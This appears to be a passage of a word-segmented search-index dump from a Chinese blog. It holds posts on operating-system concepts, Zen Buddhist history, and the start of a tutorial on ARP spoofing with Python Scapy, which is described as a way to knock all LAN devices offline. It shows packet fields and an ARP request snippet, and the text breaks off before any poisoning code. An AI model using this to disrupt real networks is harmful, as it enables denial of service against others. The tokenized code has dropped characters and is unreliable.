","可以","让我们","不用","关心","一个","当","我们","敲","下一个","字符","的","时候","，","计算机","是","怎么","接受","、","怎么","处理","以及","怎么","显示","在","我们","希望","它","显示","的","位置","，","但","学习","计算机","一定会","了解","IO","管理","系统","。","&","emsp",";","&","emsp",";","一般","IO","设备","是","不会","直接","和","CPU","进行","通信","的","，","因为","这样","会","大量","占用","CPU","的","资源","，","总","不可能","你","在","键盘","上","输入","一个","字符","，","就","直","接通","过","IO","设备","进入","到","CPU","中","。","为了","提高","CPU","的","利用率","，","IO","系统","在","IO","设备","和","CPU","通信","之间","设置","了","中间件","，","这","就是","设备","控制器","&","emsp",";","&","emsp",";","键盘","鼠标","等","输入","输出设备","现","将","内容","传输","给","设备","控制器","的","缓冲区","，","缓冲区","积累","一定","的","量","之后","，","由","设备","控制器","向","CPU","发送","一个","中断","指令","，","CPU","保存","其","运行","环境","，","然后","和","设备","控制器","进行","通信","。","至此","，","你","所","敲","下","的","信息","被","操作系统","所","认知","。","接下来","就是","CPU","将","接受","到","的","信息","进行","处理","，","将","最终","结果","返还","给","用户","，","下面","是","处理","过程","。","&","emsp",";","&","emsp",";","操作系统","是","一个","庞大的","进程","合","集","，","一个","进程","需要","将","自己","的","数据传输","给","其他","进程","，","比如说","当","你","在","网页","上","复制","一段","下载","链接","时","，","后台","的","迅雷","就","会","自动","跳出来","。","这","就是","进程","间","通信","，","通俗","一点","就是","进程","间","信息","的","传递","。","进程","通信","存在","同步","(","同步","和","互","斥",")","和","异步","两种","方式","。","而","进程","间","通信","的","具体","实现","主要","是","以下","三种","方式","：","1","、","共享","存储","设置","一个","共享","空间","互","斥","的","访问","共享","空间","两种","方式","：","基于","数据结构","、","基于","存储","区","的","共享","2","、","管道","通信","设置","一个","特殊的","共享","文件","（","管道","）","，","其实","就是","一个","缓冲区","一个","管道","只能","实现","半","双工","通信","实现","双向","同时","通信","要","建立","两个","管道","各","进程","要互","斥","的","访问","管道","写","满时","，","不能","再","写","，","读","空","时","，","不能","再读","没","写","满","，","不能","读","，","没","读","空","，","不能","写","3","、","消息","传递","传递","结构","化","的","消息","（","消息","头","消息","体","）","系统","提供","“","发送","接受","原","语","”","两种","方式","直接","通信","方式","：","消息","直接","挂到","接收","方","的","消息","队列","里","间接","（","信箱","）","通信","方式","：","消息","先","发到","中间体","（","信箱","）","&","emsp",";","&","emsp",";","通过","进程","间","通信","，","就","可以","将","消息","传递","给","其他","程序","，","其他","程序","再讲","消息","传递","给","设备","控制器","，","设备","控制器","将","数据","输出","到","屏幕","，","至此","一个","基本的","操作系统","成型","。","&","emsp",";","&","emsp",";","最后","一点","是","关于","文件系统","的","，","文件系统","规定","了","文件","存储","的","格式","，","其","同样","封装","了","文件","存储","在","磁盘","上","的","细节","，","只","留给","用户","图形","接口","来","对","文件","进行","wrx","等","操作","，","其内","部","实现","了","对","文件","的","共享","和","保护","，","常见的","文件系统","有","ext","3","、","NFS","、","exfat","等","。","&","emsp",";","&","emsp",";","文件","目录","是","一种","数据结构","，","用于","表示","系统","中的","文件","以","及其","物理地址","，","供","检索","时","使用","。","文件","目录","实现","了","“","按","名","存取","”","，","“","提高","了","对","文件","的","检索","速度","”","，","“","实现","了","文件","共享","”","，","“","允许","文件","重名","”","，","这","一切","主要","通过","定义","它","的","数据结构","FCB","来","控制","。","FCB","主要","信息","：","基本信息","：","文件名","、","物理地址","存取","控制","类","：","存取","权限","使用","信息","：","建立","时间","、","修改","时间","、","打开","文件","的","进程","数","&","emsp",";","&","emsp",";","文件","描述","信息","单独","形成","一个","称为","索引","结点","的","数据结构","，","在","文件","目录","中","，","每个","目录","项","仅","由","文件名","和","指向","该","文件名","所","对应","的","结点","指针","所","构成","，","文件","索引","表","：","文件名","指针","Name","1","Pont","1","Name","2","Pont","2","Name","3","Pont","3","&","emsp",";","&","emsp",";","这些","索引","表","最终","构成","了","简单的","文件","目录","，","单","级","文件","目录","、","两级","文件","目录","、","树形","目录","结构","。","我们","的","文件","、","程序","、","应用","等","一系列","的","数据","就","存放","在","由","格式化","的","文件系统","构成","的","目录","下","，","当","程序","执行","时","，","磁盘","通过","算法","读取","到","相应","的","信息","，","然后","是","内存","调入","(","地址","映射","，","重","定向","，","分页","管理","，","页面","置换",")","，","接着","被","处理机","(","CPU",")","执行","，","其间","会","产生","很多","中断","，","当","执行","完成","之后","，","操作系统","通过","IO","管理","系统","将","结果","发送","到","屏幕","。","&","emsp",";","&","emsp",";","然而","，","一切","到","这里","才刚","刚开始","，","这个","操作系统","的","网络","部分","还没有","浮出","水面","…",".",".","文件","管理","系统","应该","实现","按","名","存取","文件","存储空间","的","管理","–","分配","和","回收","实现","文件名","到","物理地址","的","映射","实现","对","文件","的","操作","–","建立","、","删除","、","读写","、","目录","实现","文件","共享","和","文件","保护","提供","操作","文件","的","接口","、","包括","命令","、","程序","、","菜单","Operaton","System","安全","机制","标识","与","鉴别","访问","控制","最小","权限","管理","可信","通路","安全","审计","Questons","！","进程","？","什么是","进程","？","进程","的","特性","？","如何","控制","和","产生","一个","进程","？","如何","控制","和","调度","多","个","进程","？","进程","死锁","怎么办","，","怎么","避免","？","进程","状态","转换","的","本质","是什么","，","进程","转换","过程","中","做","了","哪些","操作","？","进程","有","哪些","状态","？","进程","为什么","会","状态","转换","？","怎样","避免","多","个","进程","运行","的","时候","不","产生","混乱","？","什么是","临界","资源","？","进程","如何","访问","临界","资源","？","进程","互","斥","算法","？","两个","或者","多","个","进程","间","如","何","通信","？","为什么","要","产生","线程","？","线程","和","进程","的","区别","？","线程","有","哪些","好处","？","什么是","管程","？","为什么","要","引入","管程","，","管程","有","哪些","好处","？","CPU","？","什么是","CPU","？","CPU","能干","什么","？","什么是","调度","？","调度","有","哪","几种","？","什么时候","进行","调度","？","怎么","调度","？","怎么","评价","一个","调度","算法","的","好坏","？","早起","调度","算法","与","交互式","系统","调度","算法","有","什么","区别","？","列举","几种","常见的","CPU","调度","算法","，","并","描述","其","实现","机制","？","内存","？","什么是","内存","？","内存","有","什么","用","？","一台","电脑","内存","4","G","是什么意思","？","内存","管理","是","如何","完成","地址","映射","的","？","程序","是","如何","进入","内存","的","？","内存","是","如何","分配","和","回收","空间","的","？","内存","分配","回收","空间","有","哪","几种","算法","，","各个","的","优缺点","是什么","？","内存","的","连续","分配","和","非","连续","分配","是什么","？","分页","存储","的","基本","原理","？","分页","存储","和","分段","存储","有","什么","不同","？","用","什么样","的","数据结构","记录","系统","已经","分配","的","内存","、","以及","系统","剩余","的","内存","？","内存空间","的","扩展","是","如何","实现","的","？","内存","保护","是什么","？","有","什么","作用","？","怎么","实现","的","？","怎么","产生","的","？","虚拟","存储","机制","？","什么是","虚拟","存储","？","为什么","会","有","虚拟","存储","？","怎样","实现","虚拟","存储","？","缺页","中断","是什么","？","页面","是什么","时候","调入","？","页面","是","从","哪里","调入","？","如何","评价","一个","页面","置换","算法","的","好坏","？","页面","置换","是","如何","置换","的","？","页面","置换","的","算法","？","什么是","抖动","和","工作","集","？","IO","系统","？","为什么","要有","输入输出","系统","？","输入输出","系统","是","怎么","产生","的","？","IO","系统","的","层次","结构","模型","是","什么样","的","？","设备","控制器","是什么","？","设备","控制器","有","什么","用","？","中断","机构","和","中断","处理","程序","？","设备","驱动","程序","是什么","？","缓冲区","的","引入","有","什么","好处","？","有","哪","几种","缓冲区","？","磁盘","存储","是什么","？","磁盘","存放","数据","按照","什么","格式","？","机械","硬盘","是什么","格式","？","固态","硬盘","是什么","格式","？","U","盘存","储原理","？","怎样","衡量","一个","磁盘","调度","算法","？","有","哪些","是","磁盘","调度","算法","？","如何","实现","？","文件","管理","系统","？","为什么","会","产生","文件系统","？","文件","有","什么","数据结构","？","这些","数据结构","能","支持","文件","完成","哪些","动作","？","什么是","目录","？","为什么","会","产生","目录","？","目录","有","什么样","的","数据结构","？","目录","存放","在","磁盘","的","什么地方","？","文件","和","目录","是","怎么","建立","联系","的","？","文件","共享","是","如何","实现","的","？","文件","保护","是","如何","实现","的","？","其他","任何","程序","都","必须","满足","结构性","，","以","便于","外部","或","内部","对","其","rwx"],"url":"http://ymlog.cn/2019/08/22/OS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","title":"OS操作系统","content":"简介Operation System 是系统资源的管理者，在有限的资源内，通过算法，完成相对合理的分配。在复杂的硬件环境中，通过封装，完成动作指令的抽象化。这一切的基石，则是密集的数据结构和算法。\n相对合理体现在：\n\n调度算法实现的低...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/Linux/","name":"Linux"},"date":"2019-08-22 14:45:18"},{"word":["&","emsp",";","&","emsp",";","释迦牟尼","原名","乔达摩","·","悉达多","，","是","古印度","迦毗罗","卫国","（","今","尼泊尔","）","的","太子","，","悉达多","太子","天资","聪慧","，","长","到","12岁","时","，","就","已经","掌握","了","当时","印度","最高的","学问","，","16岁","时","，","娶","了","表妹","耶输","陀罗","为","妻","。","&","emsp",";","&","emsp",";","他","有","一次","驾车","出","城","游玩","，","在","经过","东","、","南","、","西","三","座","城门","时","，","分","别","见到","了","人类","老","、","病","、","死","的","三种","状态","，","于是","认识到","所有人","都","有","不可","逃避","的","痛苦","。","后来","当","他","在","经过","北门","，","看到","一位","游行","的","苦行僧","时","，","决定","奉行","这","一","修行","方法","，","通过","苦修","摆脱","命运","的","枷锁","。","&","emsp",";","&","emsp",";","然而","现在","却","时常","看到","世人","烧香","拜佛","，","以求","富贵","长乐","，","殊不知","，","这","正是","佛","所","放弃","的","东西","。","&","emsp",";","&","emsp",";","释迦","摩尼","历经","六年","的","苦修","，","身体","骨瘦如柴","，","却","依然","没有","找到","解脱","的","方法","。","无奈","中","，","释迦","摩尼","来到","菩提","迦耶","的","一","棵毕","波罗","树","下","，","经过","数","天","苦思","，","终于","获得","了","彻底","的","觉悟","，","立身","成","佛","，","号称","释迦牟尼","。","明朝","开始","汉","地","还","尊称","他","为","如来","佛祖","或","佛祖","。","&","emsp",";","&","emsp",";","释迦","摩尼","在","此后","的","一生一直","在","弘扬","佛法","，","直到","80岁","涅槃","于拘尸","那","城帕瓦村","旁","的","小","树林","里","。","&","emsp",";","&","emsp",";","大","梵","天王","在","灵鹫山","请","佛","讲法","，","并","赠佛","一朵","金色","的","波罗","花","。","佛","欣然","答应","，","高升","法","座","，","却","持","花","不","语","，","众","弟子","正","纳闷","，","唯有","摩诃迦叶","破颜微笑","，","佛祖","随即","宣布","：","我","有","正法眼藏","，","涅槃","妙心","，","实相","无相","，","微妙","法门","，","附","嘱摩诃迦叶","。","这","就是","禅宗","所说","的","“","拈花微笑","”","，","摩诃迦叶","也","就","成为","了","印度","禅宗","的","初祖","。","&","emsp",";","&","emsp",";","法","脉迭传至","第二十八","祖","菩提","达摩","祖师","，","达摩","祖师","秉承","师父","般","若多罗","尊者","的","嘱咐","，","来到","中国","弘法","，","成为","中国","禅宗","初祖","。","之后","便","有","梁武","帝见","达摩","的","那","一段","对话","。","帝","问","曰","：","“","朕","即位","以来","，","造寺","写","经","，","度僧","不可胜纪","，","有","何","功德","?","”","祖","曰","：","“","并无","功德","”","帝","曰","：","“","何以","无","功德","?","”","祖","曰","：","“","此","但","人天","小","果","有","漏","之","因","，","如影随形","，","虽","有","非","实","。","”","帝","曰","：","“","如何","是","真","功德","?","”","祖","曰","：","“","净智妙圆","，","体","自","空寂","，","如是","功德","，","不","以","世","求","。","”","帝","又","问","：","“","如何","是","圣谛","第一义","?","”","祖","曰","：","“","廓然","无","圣","”","。","帝","曰","：","“","对","朕者谁","?","”","祖","曰","：","“","不","识","”","。","帝","不","领悟","。","祖知机","不","契","，","是","月","十九日","，","潜回","江北","。","翻译","一下","就是","：","梁武","帝","问","达摩","：","“","我","继位","以来","，","修建","了","那么多","寺庙","超","了","那么多","经书","，","帮助","的","僧人","数","都","数","不","过来","，","我","又","没有","什么","功德","？","”","达摩","：","“","并没有","功德","”","梁武","帝","说","：","“","为什么","没有","功德","？","”","达摩","：","“","这些","只","是","世间","的","福德","，","做","善事","只","有福","德","，","没有","功德","，","因此","只能","得到","因果","福","报","，","倘若","不能","证明","自己","内心","的","自性","，","即","是","无","功德","。","”","梁武","帝","：","“","什么","才是","真","功德","？","”","达摩","：","“","功德","是","自己","修行","的","境界","，","不必","向","世间","寻求","”","&","emsp",";","&","emsp",";","后来","梁武","帝","没","听懂","，","达摩","知","其","没有","机缘","，","便","走了","，","达摩","走","后","，","梁武","帝","告知","他","的","师父","志公","禅师","，","志公","禅师","立即","对","陛下","说","：","达摩","大师","是","个","高人","。","梁武","帝","听","师傅","这么","一","说","，","立刻","派","众多","兵马","，","急急","追赶","，","一定要","把","达摩","大师","请","回来","，","兵马","追到","江边","，","却","见","达摩","大师","抛出","一根","芦苇","，","掷","在","江中","，","脚踏","芦苇","渡江","到了","洛阳","，","住在","嵩山","少林寺","，","面壁九年","，","深入","禅定","。","后来","古人","写","了","一","付","对联","：","“","一","苇渡江","何处","去","，","九年","面壁","待人","来","。","”","，","这","就是","达摩","一","苇渡江","的","故事","。","&","emsp",";","&","emsp",";","达摩","在","嵩山","少林寺","面壁","期间","，","有","很多","信","众","请求","达摩","祖师","收","他们","为","徒","，","但","达摩","祖师","一直","没有","收徒","。","有","一","天下","了","一","夜","的","雪","，","达摩","祖师","早上","醒来","，","推开","房门","，","突然","发现","门前","站立","着","一个人","，","地上","的","积雪","已经","没","过","那个人","的","膝盖","。","这个","人","叫","神","光","，","即将","成为","禅宗","二","祖","。","达摩","问","：","你","怎么会","在","这里","？","神","光","：","希望","您","能","收下","我","，","让","我","做","您","的","弟子","。","达摩","：","你","这样","是","徒劳的","，","我","不会","收","徒弟","，","你","走","吧","。","神","光","没","有","离开","，","仍然","苦苦","哀求","达摩","达摩","忽然","心念","一动","，","对","神","光","说","：","我","可以","收","你","为","徒","，","但是","要","等到","天降","红雪","的","那","一天","。","但","此时","白雪","纷飞","，","有","哪里","会","有","什么","红雪","。","神","光","问","：","只要","天降","红雪","，","你","就","会","收","我","为","徒","？","&","emsp",";","&","emsp",";","达摩","点","点头","，","神","光","没","再说","一句话","，","慢慢","拔出","腰间","的","戒刀","，","从","腋下","向上","用力","砍下","自己","的","左臂","。","一瞬间","，","他","的","左臂","飞上","天空","，","无数","红色","的","血滴","喷涌","而","出","，","把","飞扬","的","雪花","染","得","鲜红","，","落到","地上","。","“","现在","已经","天降","红雪","，","您","可以","收","我","为","徒","了","吧","！","”","神","光","在","晕倒","之前","用尽","最后","一丝","气力","问道","。","&","emsp",";","&","emsp",";","达摩","祖师","被","神","光","的","这","一举","动","震惊","了","，","也","被","他","所","感动","，","遂","收下","神","光","为","徒","。","这","就是","“","断臂","求法","”","的","故事","。","后来","神","光","该","法号","为","慧","可","，","成为","禅宗","第二代","祖师","。","&","emsp",";","&","emsp",";","这些","事件","都","发生","在","公元","400年","~","公元","600年","，","于此","同时","，","还","发生","了","一件","不大","也","不小","的","事","，","却","影响","了","后世","千百年来","僧人","的","饮食","。","那就是","梁武","帝","禁止","僧人","食肉","。","&","emsp",";","&","emsp",";","原本","和尚","是","忌荤","不","忌腥","的","，","荤","在","古代","就是","指","葱","、","蒜","、","韭","等","有","特殊","气味","的","蔬菜","，","而","腥","就是","肉类","。","这","也是","从","印度","带","过来","的","传统","，","因为","印度","的","和尚","是","需要","化缘","的","，","而不是","自己","做饭","。","可能","有些人","会","觉得","这是","和尚","懒","，","我","也是","这么","觉得","的","，","但","佛经","里面","会","给出","两种","解释","：","一","是","通过","化缘","去除","分别","心","，","人","因为","有了","分别","心","，","就","会","去","比较","，","有了","比较","就","会","有","利害得失","，","有了","利害得失","就","会","产生","烦恼","。","如果","我们","自己","做饭","，","我们","可以","决定","今天","吃","我们","喜欢","吃","的","东西","，","这","就","产生","了","分别","心","。","如果","是","去","化缘","，","别人","给","什么","就","吃","什么","，","而且","不管","是","山蒸","海味","还是","粗茶淡饭","吃","到","嘴里","都是","一个样","，","不会","因为","今天","吃得","好","而","高兴","，","也","不会","因为","今天","吃","的","差","而","埋怨","，","内心","永远","有","一种","长存","的","喜悦","，","不","应","外部","世界","的","改变","而","改变","。","二","是","佛教","讲究","布施","，","就是","帮助","别人","。","不仅","仅是","自己","帮助","别人","，","还要","让","别人","能够","帮助","别人","，","人人","助人为乐","。","化缘","也","就","给","别人","一个","帮助","他们","的","机会","。","&","emsp",";","&","emsp",";","梁武","帝","颁布","法令","禁止","僧人","食肉","，","给出","的","理由","是","佛教","应当","反对","杀生","，","但","实际上","是","因为","财政","负担","太","重","，","吃","不起","。","僧人","不需要","种田","，","所以","就","没有","赋税","，","国家","从","他们","身上","捞","不到","钱，","每年","修建","寺庙","还要","倒","贴钱","，","又","怎么会","让","这些","僧人","吃","顿","好的","。","也","正是","因为","和尚","不用","交","赋税","以","及其","提倡","的","众生","平等","，","导致","佛教","和","皇权","的","矛盾","愈发","激烈","，","但","又","因为","统治者","希望","通过","佛教","来","稳定","人心","，","让","世人","都","变成","不会","作乱","的","傻瓜","，","故而","又","和","佛教","十分","亲密","。","如此","不难","理解","，","历史上","皇权","与","佛教","之间","种种","的","爱","恨","别离","。","滚滚","长","江东","逝水","，","浪花","淘","尽","英雄","。","是非","成败","转头","空","。","青山","依旧","在","，","几度","夕阳红","。","白发","渔樵江渚","上","，","惯","看","秋月春风","。","一壶","浊酒","喜","相逢","。","古今","多少","事","，","都","付","笑谈","中","。","&","emsp",";","&","emsp",";","随着","佛教","矛盾","和","皇权","矛盾","的","激烈","，","唐代","禅师","百","丈怀海","对","禅宗","进行","了","教规","改革","，","制定","清规","（","后","称","《","百","丈","清规","》","）","。","提倡","劳动","，","亲自","躬耕","，","力行","倡导","“","一日","不","作","，","一日","不","食","”","，","把","印度","僧侣","托钵","乞食","的","传统","，","改为","中国式","的","自食其力","。","这","也是","中国","禅宗","禅院","的","诞生","，","百","丈怀海","也是","慧能","的","三世","法","孙，","禅宗","的","第四","代","宗师","。","清晨","入","古","寺","，","初","日照","高林","。","曲径通幽","处","，","禅房","花木","深","。","山","光","悦鸟性","，","潭影","空","人心","。","万籁","此","都","寂","，","但","余钟磬音","。","&","emsp",";","&","emsp",";","怀海","禅师","年事已高","，","有","一次","，","弟子","体谅","怀海","禅师","年迈","，","将","怀海","禅师","的","锄头","等","耕田","工具","藏起来","，","怀海","禅师","那","天","被迫","无法","工作","，","而","当天","，","怀海","禅师","也","拒绝","进餐","。","从此","，","再也没有","人","敢","阻止","怀海","禅师","工作","了","。","&","emsp",";","&","emsp",";","如果说","其他","佛教","的","分支","是","对","佛","，","对","西方","净土","，","或者","是","自己","的","皈依","和","醒悟","，","那么","禅宗","则","更加","看重","现实","的","世间","。","六","组","慧能","也","曾","说","：","佛法","在世","间","，","不","离世","间觉","，","离世","觅","菩提","，","恰如","求","兔角","。","布袋","和尚","有","诗言","：","手","捏","青苗","种","福田","，","低头","便见","水","中天","。","六根清净","方成","稻","，","原来","退步","是","向前","。","和尚","种","水稻","亦","能","参悟","佛法","，","这不","就是","佛法","在世","间","，","不","离世","间觉吗","。","船","子","和尚","有","诗言","：","千","尺丝纶","直","下垂","，","一波才动万波随","。","夜","静水","寒鱼","不","食","，","满船","空载","明月","归","。","&","emsp",";","&","emsp",";","及时","没有","钓","到","鱼","，","心情","依然","很好","，","虽","是","一无所获","，","却","是","满载而归","。","这是","别人","的","注释","，","我","才疏学浅","，","不知道","他","满载而归","悟道","了","什么","佛法","，","然虽","不知","意","，","心向往之","，","此","为","迷信","。","&","emsp",";","&","emsp",";","没有","了解","佛教","，","没有","明白","什么是","佛法","而","去","相信","的","，","我们","称之为","迷信","，","这个","适用于","任何事","，","比","如一个","“","专家","”","说","了","吃","什么","什么","好","，","但","你","并","不知道","为什么","吃","这个","身体","就","会","变好","，","此","也","为","迷信","。","还有","一种","，","没有","了解","佛教","，","就","说","佛教","怎么","怎么","糊弄","人","，","此","为","不信","。","就","像是","你","没有","接触","过","一个人","，","只","凭","社会","对","他","的","评价","，","就","说","这个","人","怎么","怎么样","，","此","为","乌合之众","。","细细","碎碎","初祖","达摩","，","二","祖慧","可","，","三","祖僧璨","，","四","祖道","信","、","五","祖弘忍","、","六祖","慧能","《","丛林","要则","》","丛林","以","无事","为","兴盛","。","修行","以","念佛","为","稳当","。","精进","以","持","戒","为","第一","。","疾病","以","减食","为","汤药","。","烦恼","以","忍辱","为","菩提","。","是非","以","不","辩","为","解脱","。","留众","以","老","成为","真情","。","执事","以","尽心","为","有功","。","语言","以","减少","为","直截","。","长幼","以","慈和","为","进德","。","学问","以","勤习","为","入门","。","因果","以","明白","为","无过","。","老","死","以","无常","为","警策","。","佛事","以","精严","为","切实","。","待客","以","至诚","为","供养","。","山门","以","耆","旧","为","庄严","。","凡事","以","预立","为","不","劳。","处众","以","谦恭","为","有理","。","遇险","以","不","乱","为","定力","。","济物","以","慈悲","为","根本","。","—","—","百","丈","禅师","百","丈","清规","偈","旋岚偃岳","而","常静","，","野马","飘风","而","不","鼓","。","山河","竞注","而","不","流","，","日","月历","天","而","不周","。","空","手把","出头","，","步行","骑","水牛","。","人","在","桥","上","过","，","桥","流水","不","流","。","似僧","有","发","，","似","俗","脱尘","。","做梦","中","梦","，","悟","身外","身","。"],"url":"http://ymlog.cn/2019/08/20/%E7%A6%85/","title":"禅","content":"&emsp;&emsp; 释迦牟尼原名乔达摩·悉达多，是古印度迦毗罗卫国（今尼泊尔）的太子，悉达多太子天资聪慧，长到12岁时，就已经掌握了当时印度最高的学问，16岁时，娶了表妹耶输陀罗为妻。\n&emsp;&emsp; 他有一次驾车出城...","author":"ZEN","categorie":{},"date":"2019-08-20 00:00:00"},{"word":["Arp","欺骗","-","-","-","-","Python","实现","#","#","简介","1","、","ARP","是","地址","解析","协议","，","即","ARP","（","Aress","Resoluton","Protocol","）","，","是","根据","IP","地址","获取","物理地址","的","一个","TCPIP","协议","。","2","、","当","计算机","知道","IP","地址","和","MAC","地址","，","就","会","向","局域网","中","发送","信息","，","默认","发给","默认","网关","，","如果","是","发到","局域网","外","的","信息","，","则用源","主机","IP","+","目的","这","两点","是","构造","ARP","毒化","攻击","的","基本原理","。","-","-","-","-","ARP","毒化","攻击","可以","干什么","？","ARP","毒化","可以","让","局域网","内","的","消息","都","发往","你","指定","的","网关","，","简而言之","就是","让","本地","局域网","全部","断网","，","让","连接","同一个","WF","的","设备","都","上","不了","网","。","如何","做到","的","？","计算机","、","手机","、","Ipa","上网","的","数据传输","发包","格式","为","：","源","IP","-","-","自","己","的","IP","源","MAC","-","-","自己","的","物理地址","目的","IP","-","-","如","180.101.49.12","=","=","www",".","bau",".","com","目的","MAC","-","-","本地","局域网","的","默认","网关","MAC","1","、","目标","主机","通过","ARP","广","播","(","由此可见","ARP","是","用","UDP","协议","实现",")","得到","默认","网关","MAC","地址","2","、","攻击者","通过","不断","地","发送","(","默认","网关","IP","+","非","默认","网关","MAC",")","的","形式","，","更改","目标","主机","中的","ARP","缓存","表","3","、","目标","主机","向","默认","路由","发送","消息","4","、","消息","在","局域网","内传","播","，","但","不","会通","过","MAC","地址","流入","默认","路由器","，","故","默认","路由器","也不","会","转发","目标","主机","的","消息","，","目标","主机","断网","。","即","通过","ARP","毒化","，","让","目标","主机","不能","通过","ARP","协议","，","完成","正确的","地址","映射","。","攻击者","如何","向","目标","主机","发送","(","默认","网关","IP","+","非","默认","网关","MAC",")","？","通过","Python","3","的","Scapy","库","来","实现","。","1","、","Scapy","工具","介绍","scapy","官方","文档","https",":","scapy",".","reatheocs",".","oenlatest","]","(","https",":","scapy",".","reatheocs",".","oenlatest",")","安装","pp","nstall","scapyScapy","可","用于","构造","、","发送","、","解析","各类","数据包","。","可以","用来","扫描","，","跟踪","路由","，","探测","，","单元测试","，","攻击","或","网络","发现","。","默认","包","：","以太网","头部","IP","头部","TCP","头部","pkg","=","Ehter","(",")","IP","(",")","TCP","(",")","pkg",".","show","(",")","默认","以太网","头部","#","#","#","[","Ethernet","]","#","#","#","st","=","ff",":","ff",":","ff",":","ff",":","ff",":","ff","src","=","00",":","00",":","00",":","00",":","00",":","00","type","=","IP","4","默认","IP","头部","#","#","#","[","IP","]","#","#","#","erson","=","4","hl","=","None","tos","=","0","x","0","len","=","None","=","1","flags","=","frag","=","0","ttl","=","64","proto","=","tcp","chksum","=","None","src","=","127.0.0.1","st","=","127.0.0.1","\\","optons","\\","默认","TCP","头部","#","#","#","[","TCP","]","#","#","#","sport","=","ftp","_","ata","默认","20","port","=","http","默认","80","seq","=","0","ack","=","0","ataofs","=","None","resere","=","0","flags","=","S","wnow","=","8192","chksum","=","None","urgptr","=","0","optons","=","[","]","2","、","ARP","协议","简介","ARP","协议","实现","IP","（","32","bt","）","地址","到","MAC","（","48","bt","）","地址","之间","的","动态","映射","（","由","操作系统","完成","，","用户","不必","关注","）","，","多路","访问","都会","用到","IP","地址","实现","的","具体","过程","源","主机","发送","ARP","广播","报文","段","，","在","报文","段","中","填入","自己","的","IP","地址","，","目标","的","IP","地址","，","以","及","自","己","的","MAC","地址","同一个","局域网","内","的","主机","都","接受","该","报文","段","，","并","与","自","己","的","IP","地址","相比较","如果","相同","，","则","发送","ARP","响应","报文","，","在","响应","报","文中","填入","自己","的","MAC","地址","等","如果","不同","，","则","丢弃","源","主机","接收","到","目标","主机","发出","的","ARP","响应","报文","，","放入","ARP","缓存","表","scapy","包","结构","#","#","#","[","ARP","]","#","#","#","hwtype","=","0","x","1","硬件","类型","1","：","Ethernet","ptype","=","IP","4","hwlen","=","None","plen","=","None","op","=","who","-","has","hwsrc","=","00",":","0","c",":","29",":","ab",":","65",":","55","harware","source","硬件","源地","址","psrc","=","192.168.3.37","源","IP","地址","hwst","=","None","harware","estnaton","硬件","目的","地址","pst","=","None","目的","IP","地址","3","、","Scapy","实现","ARP","扫描","&","apos",";","&","apos",";","&","apos",";","sr","(",")","发","一个","，","也","可以","接受","好几个","包","sr","1","(",")","发","一个","包","，","可能会","收到","很多","包","，","但","我","只","接受","第","一个","srp","(",")","发","多","个","，","收多","个","，","p","代表","工作","在","二层","（","以太网","层","）","sen","(",")","只管","发","senp","(",")","需要","手动","填","以太网","的","信息","&","apos",";","&","apos",";","&","apos",";","最","基本的","ARP","请求","响应","localmac","=","'","00",":","0","c",":","29",":","ab",":","65",":","55","'","localp","=","'","192.168.3.37","'","estp","=","'","192.168.3.31","'","estmac","=","estmacpkg","=","srp","(","Ether","(","src","=","localmac",",","st","=","'","FF",":","FF",":","FF",":","FF",":","FF",":","FF","'",")","ARP","(","op","=","1",",","hwsrc","=","localmac",",","hwst","=","'","00",":","00",":","00",":","00",":","00",":","00","'",")",",","face","=","'","ens","32","'",",","erbose","=","False",",","tmeout","=","1",")","#","op","=","1",":","ARP","Request","#","face","：","网卡","#","tmeout",":","设置","等待时间","#","erbose","：","不","打印","输出","ARP","响应","的","解析","—","Scapy","—","—","ARP","数据结构","分析","pkg","#","(","Results",":","TCP",":","0","UDP",":","0","ICMP",":","0","Other",":","1",",","Unanswere",":","TCP",":","0","UDP",":","0","ICMP",":","0","Other",":","0",")","元祖","pkg","[","0","]","选择","响应","的","ARP","包","#","Results",":","TCP",":","0","UDP",":","0","ICMP",":","0","Other",":","1","pkg","[","0","]",".","res","生成","收发","包","的","清单","#","用","列表","容纳","收发","队列","组成","的","元祖","，","对应","一组","计算机","[","第一个","收发","(","#","发送","的","包","Ether","st","=","FF",":","FF",":","FF",":","FF",":","FF",":","FF","src","=","00",":","0","c",":","29",":","ab",":","65",":","55","type","=","ARP","ARP","op","=","who","-","has","hwsrc","=","00",":","0","c",":","29",":","ab",":","65",":","55","psrc","=","192.168.3.37","pst","=","192.168.3.31",",","#","接受","的","包","Ether","st","=","00",":","0","c",":","29",":","ab",":","65",":","55","src","=","58",":","00",":","e","3",":","7",":","5",":","ef","type","=","ARP","ARP","hwtype","=","0","x","1","ptype","=","IP","4","hwlen","=","6","plen","=","4","op","=","s","-","at","hwsrc","=","58",":","00",":","e","3",":","7",":","5",":","ef","psrc","=","192.168.3.31","hwst","=","00",":","0","c",":","29",":","ab",":","65",":","55","pst","=","192.168.3.37","Pang","loa","=","'","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","'",")","]","#","元祖","-","-","包含","了","收发","的","所有","包","pkg","[","0","]",".","res","[","0","]","选择","第","一个","收发","的","包","#","就","对应","一个","计算机","(","Ether","st","=","FF",":","FF",":","FF",":","FF",":","FF",":","FF","src","=","00",":","0","c",":","29",":","ab",":","65",":","55","type","=","ARP","ARP","op","=","who","-","has","hwsrc","=","00",":","0","c",":","29",":","ab",":","65",":","55","psrc","=","192.168.3.37","pst","=","192.168.3.31",",","Ether","st","=","00",":","0","c",":","29",":","ab",":","65",":","55","src","=","58",":","00",":","e","3",":","7",":","5",":","ef","type","=","ARP","ARP","hwtype","=","0","x","1","ptype","=","IP","4","hwlen","=","6","plen","=","4","op","=","s","-","at","hwsrc","=","58",":","00",":","e","3",":","7",":","5",":","ef","psrc","=","192.168.3.31","hwst","=","00",":","0","c",":","29",":","ab",":","65",":","55","pst","=","192.168.3.37","Pang","loa","=","'","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","\\","x","00","'",")","pkg","[","0","]",".","res","[","0","]","[","1","]","选择","响应","的","那","一部分","pkg","[","0","]",".","res","[","0","]","[","1","]","[","0","]",".","fels","选择","响应","的","那","一部分","的","以太网","头部","#","&","#","123",";","'","st","'",":","'","00",":","0","c",":"